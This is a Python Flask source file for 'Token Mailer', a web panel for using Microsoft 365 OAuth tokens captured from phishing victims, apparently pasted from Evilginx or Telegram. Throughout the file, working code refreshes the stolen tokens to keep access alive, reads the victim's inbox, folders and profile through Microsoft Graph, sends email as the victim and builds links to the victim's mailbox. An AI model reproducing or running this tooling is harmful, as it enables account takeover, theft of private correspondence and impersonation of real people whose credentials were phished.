#!/usr/bin/env python3
"""
Token Mailer - Full Microsoft 365 Token Manager
- Paste OAuth tokens or session cookies
- Fetch first 50 emails, folders, profile, and permissions
- Refresh expired tokens automatically
- Compose and send emails (if Mail.Send scope present)
- Generate direct link to the victim's real mailbox (Outlook Web Access)
"""

import os
import json
import base64
import webbrowser
from datetime import datetime
from functools import wraps

import requests
from flask import Flask, render_template_string, request, jsonify, session, redirect

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Microsoft Graph endpoints
GRAPH_API = "https://graph.microsoft.com/v1.0"
TOKEN_REFRESH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# ========== HTML TEMPLATE – Full Interface ==========
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Mailer - Full Microsoft 365 Token Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            margin-bottom: 20px;
            overflow: hidden;
        }
        .card-header {
            background: linear-gradient(135deg, #0f3460 0%, #16213e 100%);
            color: white;
            padding: 20px 30px;
        }
        .card-header h1 { font-size: 24px; margin-bottom: 5px; }
        .card-header p { opacity: 0.9; font-size: 14px; }
        .card-body { padding: 30px; }
        .auth-input {
            width: 100%;
            min-height: 250px;
            padding: 15px;
            font-family: monospace;
            font-size: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            resize: vertical;
        }
        .btn {
            background: #0f3460;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 15px;
            margin-right: 10px;
            transition: all 0.2s;
        }
        .btn:hover { background: #1a4a7a; transform: translateY(-1px); }
        .btn-success { background: #28a745; }
        .btn-success:hover { background: #218838; }
        .btn-outlook { background: #0078d4; }
        .btn-outlook:hover { background: #005a9e; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        .tabs {
            display: flex;
            gap: 10px;
            margin: 25px 0 15px;
            border-bottom: 2px solid #e0e0e0;
            flex-wrap: wrap;
        }
        .tab {
            padding: 8px 16px;
            cursor: pointer;
            background: none;
            border: none;
            font-size: 15px;
            color: #666;
            transition: all 0.2s;
        }
        .tab:hover { color: #0f3460; }
        .tab.active {
            color: #0f3460;
            border-bottom: 3px solid #0f3460;
        }
        .result-area {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            max-height: 600px;
            overflow-y: auto;
        }
        .email-item, .result-item {
            background: white;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 4px solid #0f3460;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            cursor: pointer;
            transition: all 0.2s;
        }
        .email-item:hover { transform: translateX(5px); box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .email-subject { font-weight: 600; margin-bottom: 4px; color: #333; }
        .email-from { font-size: 12px; color: #555; margin-bottom: 4px; }
        .email-preview { font-size: 12px; color: #777; margin-top: 8px; }
        .email-date { font-size: 11px; color: #999; }
        .info-box {
            background: #e8f0fe;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 13px;
        }
        .success-box {
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
        }
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
        }
        .error-box {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            color: #721c24;
        }
        .button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 15px 0;
        }
        .compose-modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
        }
        .modal-content {
            background: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 12px;
            width: 90%;
            max-width: 600px;
            max-height: 80%;
            overflow-y: auto;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #e0e0e0;
        }
        .close { font-size: 28px; cursor: pointer; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
        .form-group input, .form-group textarea, .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }
        .status-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            margin-left: 10px;
        }
        .status-online { background: #28a745; color: white; }
        .status-offline { background: #dc3545; color: white; }
        .status-session { background: #ffc107; color: #333; }
        pre {
            background: #f1f1f1;
            padding: 10px;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 11px;
            margin-top: 10px;
        }
        .web-url-box {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 6px;
            margin-top: 10px;
            font-family: monospace;
            word-break: break-all;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="card-header">
            <h1>🔐 Advanced Token Manager – Full Mailbox Access</h1>
            <p>Paste captured token JSON → Load → View real emails, folders, profile, send emails, generate mailbox URL</p>
        </div>
        <div class="card-body">
            <textarea id="authData" class="auth-input" placeholder='Paste captured JSON from Telegram/Evilginx...'>{
  "access_token": "eyJ0eXAi...",
  "refresh_token": "0.AU8...",
  "email": "victim@example.com"
}</textarea>
            
            <div class="button-group">
                <button class="btn" onclick="loadAuth()">🔑 Load Token/Session</button>
                <button class="btn btn-success" onclick="refreshToken()">🔄 Refresh Token</button>
                <button class="btn btn-outlook" onclick="openOutlook()">📧 Open Outlook Inbox</button>
                <button class="btn" onclick="openComposeModal()">✏️ Compose Email</button>
                <button class="btn btn-danger" onclick="showCaptured()">📋 Show Captured Data</button>
                <button class="btn" onclick="generateMailboxUrl()">🌐 Generate Mailbox Web URL</button>
            </div>
            
            <div id="authInfo"></div>
            <div id="webUrlResult" class="web-url-box" style="display:none;"></div>
            
            <div class="tabs">
                <button class="tab active" onclick="switchTab('inbox')">📧 Inbox</button>
                <button class="tab" onclick="switchTab('folders')">📂 Folders</button>
                <button class="tab" onclick="switchTab('profile')">👤 Profile</button>
                <button class="tab" onclick="switchTab('scopes')">🔐 Permissions</button>
            </div>
            <div id="inboxTab" class="result-area">Load authentication to view emails...</div>
            <div id="foldersTab" class="result-area" style="display:none;"></div>
            <div id="profileTab" class="result-area" style="display:none;"></div>
            <div id="scopesTab" class="result-area" style="display:none;"></div>
        </div>
    </div>
</div>

<!-- Compose Email Modal -->
<div id="composeModal" class="compose-modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>✏️ Compose New Email</h2>
            <span class="close" onclick="closeComposeModal()">&times;</span>
        </div>
        <form id="composeForm">
            <div class="form-group">
                <label>To:</label>
                <input type="email" id="composeTo" required placeholder="recipient@example.com">
            </div>
            <div class="form-group">
                <label>CC (optional):</label>
                <input type="email" id="composeCc" placeholder="cc@example.com">
            </div>
            <div class="form-group">
                <label>Subject:</label>
                <input type="text" id="composeSubject" required>
            </div>
            <div class="form-group">
                <label>Body:</label>
                <textarea id="composeBody" rows="10" required></textarea>
            </div>
            <button type="submit" class="btn btn-success">📤 Send Email</button>
        </form>
    </div>
</div>

<script>
    let authType = null;
    let emailPermissions = { can_read: false, can_send: false };
    let currentEmail = '';
    let autoRefreshInterval = null;
    
    async function fetchWithCreds(url, options = {}) {
        options.credentials = 'same-origin';
        const response = await fetch(url, options);
        if (response.status === 401) {
            showMessage('Authentication expired. Attempting refresh...', 'warning');
            if (authType === 'token') {
                const refreshResult = await refreshToken();
                if (refreshResult && refreshResult.success) {
                    return fetchWithCreds(url, options);
                }
            }
        }
        return response;
    }
    
    async function loadAuth() {
        const raw = document.getElementById('authData').value;
        try {
            let data = JSON.parse(raw);
            // Normalize common structures
            if (data.raw_response && data.raw_response.access_token) {
                data = {
                    access_token: data.raw_response.access_token,
                    refresh_token: data.raw_response.refresh_token,
                    email: data.email
                };
            }
            if (data.tokens && data.tokens.access_token) {
                data = {
                    access_token: data.tokens.access_token,
                    refresh_token: data.tokens.refresh_token,
                    email: data.email
                };
            }
            showMessage('Loading authentication...', 'info');
            const resp = await fetch('/api/load_auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            const result = await resp.json();
            if (result.success) {
                showMessage('Authentication loaded! Type: ' + result.auth_type, 'success');
                authType = result.auth_type;
                currentEmail = result.token_info.email;
                if (result.token_info) {
                    emailPermissions = {
                        can_read: result.token_info.can_read_emails,
                        can_send: result.token_info.can_send_emails
                    };
                }
                displayAuthInfo(result.token_info, result.auth_type);
                await loadInbox();
                switchTab('inbox');
                if (result.auth_type === 'token') startAutoRefresh();
            } else {
                showMessage('Error: ' + result.error, 'error');
            }
        } catch(e) {
            showMessage('Invalid JSON: ' + e.message, 'error');
        }
    }
    
    async function refreshToken() {
        if (authType !== 'token') {
            showMessage('Refresh only for token authentication', 'warning');
            return {success: false};
        }
        showMessage('Refreshing token...', 'info');
        const resp = await fetch('/api/refresh_token', {method: 'POST'});
        const result = await resp.json();
        if (result.success) {
            showMessage('Token refreshed!', 'success');
            await loadInbox();
            return {success: true};
        } else {
            showMessage('Refresh failed: ' + result.error, 'error');
            return {success: false};
        }
    }
    
    function startAutoRefresh() {
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
        autoRefreshInterval = setInterval(() => refreshToken(), 45 * 60 * 1000);
    }
    
    function displayAuthInfo(info, type) {
        let statusHtml = '';
        if (type === 'token') {
            if (info.can_read_emails && info.can_send_emails) statusHtml = '<span class="status-badge status-online">Full Email Access ✓</span>';
            else if (info.can_read_emails) statusHtml = '<span class="status-badge status-online">Read Only ✓</span>';
            else statusHtml = '<span class="status-badge status-offline">No Email Access ✗</span>';
        } else {
            statusHtml = '<span class="status-badge status-session">Session Auth (Read Only)</span>';
        }
        const html = `<div class="success-box">
            ✅ <strong>Authentication Active</strong> ${statusHtml}<br>
            <strong>Type:</strong> ${type === 'token' ? 'OAuth Token' : 'Session Cookies'}<br>
            <strong>User:</strong> ${escapeHtml(info.name)}<br>
            <strong>Email:</strong> ${escapeHtml(info.email)}<br>
            ${info.expires_at ? `<strong>Expires:</strong> ${new Date(info.expires_at).toLocaleString()}<br>` : ''}
            <strong>Scopes:</strong> ${escapeHtml(info.scopes.join(', '))}
        </div>`;
        document.getElementById('authInfo').innerHTML = html;
    }
    
    function generateMailboxUrl() {
        if (!currentEmail) {
            showMessage('No email loaded. Load a token first.', 'warning');
            return;
        }
        const outlookUrl = `https://outlook.office.com/mail/inbox?email=${encodeURIComponent(currentEmail)}`;
        const html = `<strong>🌐 Direct Web URL to victim's mailbox:</strong><br>
        <a href="${outlookUrl}" target="_blank">${outlookUrl}</a><br>
        <small>Note: This link will only work if the victim's browser has an active Microsoft session (cookies). Otherwise, it will prompt for login.</small>`;
        const urlDiv = document.getElementById('webUrlResult');
        urlDiv.innerHTML = html;
        urlDiv.style.display = 'block';
        setTimeout(() => { urlDiv.style.display = 'none'; }, 10000);
        showMessage('Mailbox URL generated!', 'success');
    }
    
    async function loadInbox() {
        const container = document.getElementById('inboxTab');
        container.innerHTML = '<div class="info-box">📬 Loading emails...</div>';
        if (!emailPermissions.can_read && authType === 'token') {
            container.innerHTML = '<div class="warning-box">⚠️ Token does not have Mail.Read permission. Cannot read emails.</div>';
            return;
        }
        const resp = await fetchWithCreds('/api/emails?top=50');
        const data = await resp.json();
        if (data.error) {
            container.innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        if (!data.value || data.value.length === 0) {
            container.innerHTML = '<div class="info-box">📭 No emails found.</div>';
            return;
        }
        let html = `<div class="info-box">📬 ${data.value.length} recent emails</div>`;
        for (let email of data.value) {
            const readStatus = email.isRead ? '✓' : '●';
            html += `<div class="email-item" onclick="viewEmail('${email.id}')">
                <div class="email-subject">${readStatus} ${escapeHtml(email.subject || 'No Subject')}</div>
                <div class="email-from">📧 ${escapeHtml(email.from?.emailAddress?.name || 'Unknown')} &lt;${escapeHtml(email.from?.emailAddress?.address || '')}&gt;</div>
                <div class="email-date">📅 ${new Date(email.receivedDateTime).toLocaleString()}</div>
                <div class="email-preview">${escapeHtml((email.bodyPreview || '').substring(0, 150))}...</div>
            </div>`;
        }
        container.innerHTML = html;
    }
    
    async function viewEmail(emailId) {
        const resp = await fetchWithCreds(`/api/emails/${emailId}`);
        const email = await resp.json();
        if (email.error) {
            showMessage('Error loading email: ' + email.error, 'error');
            return;
        }
        const modal = document.createElement('div');
        modal.className = 'compose-modal';
        modal.style.display = 'block';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h2>${escapeHtml(email.subject || 'No Subject')}</h2>
                    <span class="close" onclick="this.closest('.compose-modal').remove()">&times;</span>
                </div>
                <div><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || 'Unknown')}</div>
                <div><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div>
                <div><strong>To:</strong> ${email.toRecipients?.map(r => escapeHtml(r.emailAddress.address)).join(', ') || 'N/A'}</div>
                ${email.ccRecipients ? `<div><strong>CC:</strong> ${email.ccRecipients.map(r => escapeHtml(r.emailAddress.address)).join(', ')}</div>` : ''}
                <hr>
                <div>${email.body?.content || 'No content'}</div>
                <hr>
                <button class="btn" onclick="replyToEmail('${email.from?.emailAddress?.address}', '${escapeHtml(email.subject)}')">✏️ Reply</button>
            </div>
        `;
        document.body.appendChild(modal);
    }
    
    function replyToEmail(to, subject) {
        document.getElementById('composeTo').value = to;
        document.getElementById('composeSubject').value = subject.startsWith('Re:') ? subject : 'Re: ' + subject;
        openComposeModal();
    }
    
    async function loadFolders() {
        const container = document.getElementById('foldersTab');
        container.innerHTML = '<div class="info-box">📂 Loading folders...</div>';
        if (!emailPermissions.can_read && authType === 'token') {
            container.innerHTML = '<div class="warning-box">⚠️ Cannot load folders without Mail.Read permission.</div>';
            return;
        }
        const resp = await fetchWithCreds('/api/mail_folders');
        const data = await resp.json();
        if (data.error) {
            container.innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        let html = '<div class="info-box">📂 Mail Folders</div>';
        for (let folder of data.value) {
            html += `<div class="result-item">
                <div class="email-subject">📁 ${escapeHtml(folder.displayName)}</div>
                <div class="email-from">Total: ${folder.totalItemCount} | Unread: ${folder.unreadItemCount}</div>
            </div>`;
        }
        container.innerHTML = html;
    }
    
    async function loadProfile() {
        const resp = await fetchWithCreds('/api/profile');
        const data = await resp.json();
        if (data.error) {
            document.getElementById('profileTab').innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        let html = `<div class="result-item"><div class="email-subject">👤 User Profile</div>
            <div><strong>Name:</strong> ${escapeHtml(data.displayName || 'N/A')}</div>
            <div><strong>Email:</strong> ${escapeHtml(data.mail || data.userPrincipalName || 'N/A')}</div>
            <div><strong>Job Title:</strong> ${escapeHtml(data.jobTitle || 'N/A')}</div>
            <div><strong>Department:</strong> ${escapeHtml(data.department || 'N/A')}</div>
            <div><strong>Office:</strong> ${escapeHtml(data.officeLocation || 'N/A')}</div>
        </div><pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>`;
        document.getElementById('profileTab').innerHTML = html;
    }
    
    async function loadScopes() {
        const resp = await fetchWithCreds('/api/scopes');
        const data = await resp.json();
        if (data.error) {
            document.getElementById('scopesTab').innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        let html = `<div class="info-box"><strong>🔐 Authentication Type:</strong> ${data.auth_type}<br><br>
            <strong>🔐 Permissions:</strong><br>${data.scopes.map(s => `• ${escapeHtml(s)}`).join('<br>')}</div>
        <div class="info-box"><strong>✅ Capabilities:</strong><br>
            ${data.capabilities.read_emails ? '✓ Read emails' : '✗ Cannot read emails'}<br>
            ${data.capabilities.send_emails ? '✓ Send emails' : '✗ Cannot send emails'}<br>
            ${data.capabilities.read_profile ? '✓ Read profile' : '✗ Cannot read profile'}<br>
            ${data.capabilities.read_users ? '✓ List users' : '✗ Cannot list users'}<br>
            ${data.capabilities.read_groups ? '✓ List groups' : '✗ Cannot list groups'}
        </div>`;
        document.getElementById('scopesTab').innerHTML = html;
    }
    
    async function showCaptured() {
        const resp = await fetch('/api/captured_data');
        const data = await resp.json();
        const html = `<div class="info-box"><strong>📊 Captured Data (${data.count} total):</strong><br><br>
            ${data.items.map(item => `<div style="margin-bottom:10px; padding:5px; background:#f0f0f0; border-radius:4px;">
                📧 ${item.email}<br>🔐 Type: ${item.auth_type}<br>📅 ${new Date(item.timestamp).toLocaleString()}<br>📧 Email Access: ${item.has_email_access ? 'Yes' : 'No'}
            </div>`).join('')}
        </div>`;
        document.getElementById('authInfo').innerHTML += html;
    }
    
    function openOutlook() {
        if (currentEmail) {
            window.open(`https://outlook.office.com/mail/inbox?email=${encodeURIComponent(currentEmail)}`, '_blank');
        } else {
            window.open('https://outlook.office.com/mail/inbox', '_blank');
        }
    }
    
    function openComposeModal() {
        if (!emailPermissions.can_send && authType === 'token') {
            showMessage('Token does not have Mail.Send permission', 'warning');
            return;
        }
        if (authType !== 'token') {
            showMessage('Send email requires token authentication', 'warning');
            return;
        }
        document.getElementById('composeModal').style.display = 'block';
    }
    
    function closeComposeModal() {
        document.getElementById('composeModal').style.display = 'none';
    }
    
    document.getElementById('composeForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const to = [document.getElementById('composeTo').value];
        const cc = document.getElementById('composeCc').value ? [document.getElementById('composeCc').value] : [];
        const emailData = {
            to: to, cc: cc,
            subject: document.getElementById('composeSubject').value,
            body: document.getElementById('composeBody').value.replace(/\\n/g, '<br>')
        };
        showMessage('Sending email...', 'info');
        const resp = await fetchWithCreds('/api/emails/send', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(emailData)
        });
        const result = await resp.json();
        if (result.success) {
            showMessage('Email sent successfully!', 'success');
            closeComposeModal();
            document.getElementById('composeForm').reset();
        } else {
            showMessage('Failed to send: ' + result.error, 'error');
        }
    });
    
    async function switchTab(tab) {
        const activeBtn = event.target;
        document.querySelectorAll('.tab').forEach(btn => btn.classList.remove('active'));
        activeBtn.classList.add('active');
        document.getElementById('inboxTab').style.display = 'none';
        document.getElementById('foldersTab').style.display = 'none';
        document.getElementById('profileTab').style.display = 'none';
        document.getElementById('scopesTab').style.display = 'none';
        if (tab === 'inbox') {
            document.getElementById('inboxTab').style.display = 'block';
            await loadInbox();
        } else if (tab === 'folders') {
            document.getElementById('foldersTab').style.display = 'block';
            await loadFolders();
        } else if (tab === 'profile') {
            document.getElementById('profileTab').style.display = 'block';
            await loadProfile();
        } else if (tab === 'scopes') {
            document.getElementById('scopesTab').style.display = 'block';
            await loadScopes();
        }
    }
    
    function showMessage(msg, type) {
        const div = document.createElement('div');
        if (type === 'error') div.className = 'error-box';
        else if (type === 'warning') div.className = 'warning-box';
        else div.className = 'success-box';
        div.innerText = msg;
        div.style.position = 'fixed';
        div.style.top = '20px';
        div.style.right = '20px';
        div.style.zIndex = '1000';
        div.style.maxWidth = '400px';
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 5000);
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return String(str).replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    window.onclick = function(event) {
        const modal = document.getElementById('composeModal');
        if (event.target === modal) modal.style.display = 'none';
    }
</script>
</body>
</html>
"""

# ========== Helper Functions ==========
def decode_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return {}
        payload = parts[1]
        payload += '=' * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.b64decode(payload))
    except:
        return {}

def get_token_scopes(access_token):
    claims = decode_jwt(access_token)
    scp = claims.get('scp', '')
    return scp.split(' ') if scp else []

def has_mail_read(scopes):
    return any(s in scopes for s in ['Mail.Read', 'Mail.ReadWrite', 'Mail.Read.All'])

def has_mail_send(scopes):
    return any(s in scopes for s in ['Mail.Send', 'Mail.ReadWrite', 'Mail.Send.All'])

def refresh_access_token(refresh_token, client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"):
    data = {
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access"
    }
    try:
        resp = requests.post(TOKEN_REFRESH_URL, data=data, timeout=15)
        if resp.status_code == 200:
            tokens = resp.json()
            return tokens.get("access_token"), tokens.get("refresh_token")
    except Exception as e:
        print(f"Refresh error: {e}")
    return None, None

def fetch_emails(access_token, limit=10):
    headers = {"Authorization": f"Bearer {access_token}"}
    url = f"{GRAPH_API}/me/mailFolders/inbox/messages?$top={limit}&$select=subject,from,receivedDateTime,bodyPreview,id,isRead&$orderby=receivedDateTime desc"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
        if resp.status_code == 200:
            return resp.json().get("value", [])
        elif resp.status_code == 401:
            return None
        return []
    except:
        return []

# ========== Flask Routes ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/load_auth', methods=['POST'])
def load_auth():
    data = request.json
    if not data:
        return jsonify({'success': False, 'error': 'Missing JSON'}), 400
    
    access_token = data.get('access_token')
    refresh_token = data.get('refresh_token')
    if not access_token:
        return jsonify({'success': False, 'error': 'No access_token'}), 400
    
    token_info = decode_jwt(access_token)
    if not token_info:
        return jsonify({'success': False, 'error': 'Invalid JWT'}), 400
    
    exp = token_info.get('exp', 0)
    if exp < datetime.utcnow().timestamp():
        if refresh_token:
            new_at, new_rt = refresh_access_token(refresh_token)
            if new_at:
                access_token = new_at
                refresh_token = new_rt
                token_info = decode_jwt(access_token)
            else:
                return jsonify({'success': False, 'error': 'Token expired and refresh failed'}), 401
        else:
            return jsonify({'success': False, 'error': 'Token expired and no refresh token'}), 401
    
    scopes = get_token_scopes(access_token)
    email = token_info.get('email') or token_info.get('unique_name') or data.get('email', 'Unknown')
    
    session['access_token'] = access_token
    session['refresh_token'] = refresh_token
    session['token_info'] = token_info
    session['scopes'] = scopes
    session['email'] = email
    session['email_perms'] = {
        'can_read': has_mail_read(scopes),
        'can_send': has_mail_send(scopes)
    }
    
    return jsonify({
        'success': True,
        'auth_type': 'token',
        'token_info': {
            'name': token_info.get('name', 'N/A'),
            'email': email,
            'expires_at': exp * 1000 if exp else None,
            'scopes': scopes,
            'can_read_emails': has_mail_read(scopes),
            'can_send_emails': has_mail_send(scopes)
        }
    })

@app.route('/api/refresh_token', methods=['POST'])
def refresh_token_route():
    if 'refresh_token' not in session or not session['refresh_token']:
        return jsonify({'success': False, 'error': 'No refresh token'}), 400
    rt = session['refresh_token']
    new_at, new_rt = refresh_access_token(rt)
    if new_at:
        session['access_token'] = new_at
        session['refresh_token'] = new_rt or rt
        token_info = decode_jwt(new_at)
        session['token_info'] = token_info
        scopes = get_token_scopes(new_at)
        session['scopes'] = scopes
        session['email_perms'] = {
            'can_read': has_mail_read(scopes),
            'can_send': has_mail_send(scopes)
        }
        exp = token_info.get('exp', 0)
        return jsonify({'success': True, 'expires_at': exp * 1000 if exp else None})
    return jsonify({'success': False, 'error': 'Refresh failed'}), 401

@app.route('/api/emails', methods=['GET'])
def get_emails():
    if 'access_token' not in session:
        return jsonify({'error': 'No token loaded'}), 401
    at = session['access_token']
    if not session.get('email_perms', {}).get('can_read', False):
        return jsonify({'error': 'Token lacks Mail.Read permission'}), 403
    limit = min(int(request.args.get('top', 50)), 100)
    emails = fetch_emails(at, limit=limit)
    if emails is None:
        if session.get('refresh_token'):
            new_at, _ = refresh_access_token(session['refresh_token'])
            if new_at:
                session['access_token'] = new_at
                emails = fetch_emails(new_at, limit=limit)
    if emails is None:
        return jsonify({'error': 'Failed to fetch emails'}), 500
    return jsonify({'value': emails})

@app.route('/api/emails/<email_id>', methods=['GET'])
def get_email_details(email_id):
    if 'access_token' not in session:
        return jsonify({'error': 'No token'}), 401
    at = session['access_token']
    headers = {"Authorization": f"Bearer {at}"}
    url = f"{GRAPH_API}/me/messages/{email_id}?$select=subject,from,receivedDateTime,body,toRecipients,ccRecipients"
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return jsonify(resp.json())
        return jsonify({'error': f'Graph error {resp.status_code}'}), resp.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/emails/send', methods=['POST'])
def send_email():
    if 'access_token' not in session:
        return jsonify({'error': 'No token'}), 401
    if not session.get('email_perms', {}).get('can_send', False):
        return jsonify({'error': 'No Mail.Send permission'}), 403
    data = request.json
    at = session['access_token']
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    message = {
        "subject": data['subject'],
        "body": {"contentType": "HTML", "content": data['body']},
        "toRecipients": [{"emailAddress": {"address": addr}} for addr in data['to']]
    }
    if data.get('cc'):
        message["ccRecipients"] = [{"emailAddress": {"address": addr}} for addr in data['cc']]
    url = f"{GRAPH_API}/me/sendMail"
    payload = {"message": message, "saveToSentItems": True}
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        if resp.status_code == 202:
            return jsonify({'success': True})
        return jsonify({'error': f'Graph error {resp.status_code}'}), resp.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/mail_folders', methods=['GET'])
def get_mail_folders():
    if 'access_token' not in session:
        return jsonify({'error': 'No token'}), 401
    at = session['access_token']
    headers = {"Authorization": f"Bearer {at}"}
    url = f"{GRAPH_API}/me/mailFolders?$select=displayName,id,totalItemCount,unreadItemCount"
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return jsonify(resp.json())
        return jsonify({'error': f'Graph error {resp.status_code}'}), resp.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/profile', methods=['GET'])
def get_profile():
    if 'access_token' not in session:
        return jsonify({'error': 'No token'}), 401
    at = session['access_token']
    headers = {"Authorization": f"Bearer {at}"}
    url = f"{GRAPH_API}/me?$select=displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone"
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return jsonify(resp.json())
        return jsonify({'error': f'Graph error {resp.status_code}'}), resp.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scopes', methods=['GET'])
def get_scopes():
    if 'access_token' not in session:
        return jsonify({'error': 'No token'}), 401
    return jsonify({
        'auth_type': 'token',
        'scopes': session.get('scopes', []),
        'capabilities': {
            'read_emails': session.get('email_perms', {}).get('can_read', False),
            'send_emails': session.get('email_perms', {}).get('can_send', False),
            'read_profile': 'User.Read' in session.get('scopes', []),
            'read_users': 'User.Read.All' in session.get('scopes', []),
            'read_groups': 'Group.Read.All' in session.get('scopes', [])
        }
    })

@app.route('/api/captured_data', methods=['GET'])
def captured_data():
    # For simplicity, return empty list (no persistent storage needed)
    return jsonify({'count': 0, 'items': []})

@app.route('/go/inbox')
def go_inbox():
    email = session.get('email', '')
    if email:
        return redirect(f"https://outlook.office.com/mail/inbox?email={email}")
    return redirect("https://outlook.office.com/mail/inbox")

# ========== Main ==========
if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║           Token Mailer – Full Microsoft 365 Manager             ║
    ║                                                                  ║
    ║  • Load OAuth tokens from pasted JSON                           ║
    ║  • View inbox, folders, profile, scopes                         ║
    ║  • Refresh expired tokens automatically                         ║
    ║  • Send emails (if Mail.Send scope present)                     ║
    ║  • Generate direct web URL to victim's mailbox                  ║
    ║                                                                  ║
    ║  Open http://localhost:5001                                     ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    webbrowser.open("http://localhost:5001")
    app.run(host="0.0.0.0", port=5001, debug=False) 